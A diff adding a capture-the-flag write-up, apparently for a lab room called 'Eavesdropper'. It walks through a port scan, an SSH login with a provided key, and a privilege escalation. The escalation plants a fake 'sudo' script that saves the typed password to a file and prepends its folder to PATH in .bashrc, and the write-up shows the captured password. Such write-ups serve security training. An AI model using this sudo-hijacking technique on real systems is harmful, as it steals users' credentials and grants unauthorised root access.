@@ -1,0 +1,100 @@
+eavesdropper write up
+
+info of target: 
+
+ip- 10.48.165.220
+id_rsa  ~/THM/id-rsa-1647296932800.id-rsa
+user- 'frank'
+
+
+1- nmap scan for open port we see only one which is ssh on port 22
+$ nmap 10.48.165.220
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-26 16:02 +04
+Nmap scan report for 10.48.165.220
+Host is up (0.077s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
+
+
+2- using the provided id_rsa key to connect to the 'frank' user using ssh after giving the key permissions using chmod 600.
+
+$chmod 400 ./id-rsa-1647296932800.id-rsa
+$ ssh -i id-rsa-1647296932800.id-rsa frank@10.48.165.220
+
+
+The authenticity of host '10.48.165.220 (10.48.165.220)' can't be established.
+ED25519 key fingerprint is SHA256:WaKDmh6WMRiZ/ysLM5UQM/UirbKKHGy+jRJ5euxQS84.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? ywa
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.48.165.220' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Fri Jun 26 10:30:42 2026 from 172.18.0.3
+
+
+3-runnning cat /etc/hosts to see networks and we see, after seeing the hint "What's going on in the system?", so runing top it doesnt show much
+
+$ cat /etc/hosts
+
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.18.0.2      workstation
+
+4- running $ps aux
+
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  1.3  12172  6368 ?        Ss   10:16   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root        1463  0.0  1.6  13580  7844 ?        Ss   10:30   0:00 sshd: frank [priv]
+frank       1517  0.0  1.3  14728  6340 ?        S    10:30   0:00 sshd: frank@pts/0
+frank       1518  0.0  0.7   5992  3444 pts/0    Ss+  10:30   0:00 -bash
+frank       3759  0.0  0.6   4972  2908 pts/0    T    10:51   0:00 watch -d -n 0.1 pidof sudo | xargs -I{} cat /proc/{}/fd/0 | tee -a password
+root        6580  0.0  1.9  13576  8908 ?        Ss   11:12   0:00 sshd: frank [priv]
+frank       6591  0.0  1.1  13900  5180 ?        R    11:12   0:00 sshd: frank@pts/1
+frank       6593  0.0  0.8   5992  3864 pts/1    Ss   11:12   0:00 -bash
+frank       7083  0.0  0.6   7644  3212 pts/1    R+   11:16   0:00 ps aux
+
+
+5- elevation of privilege (EoP)
+--here we create a fake sudo that will run along the sudo real command, after we fake the path to sudo in the other step--
+
+$mkdir bin
+$vim bin/sudo
+
+in vim{
+
+#!/bin/bash
+read -p "rv2_hex" password
+echo $password > /home/frank/pass.txt
+
+}esc, then :wq enter
+
+--here we inter the path to the top of the file so everytime we run sudo it runs our fake sudo before the real one--
+$chmod +x bin/sudo
+$ vim .bashrc
+
+$export PATH=/home/frank/bin:$PATH
+
+and then we get frank password!!!
+
+6- final, after running sudo
+
+$cat pass.txt
+!@#frankisawesome2022%*
+$sudo bash
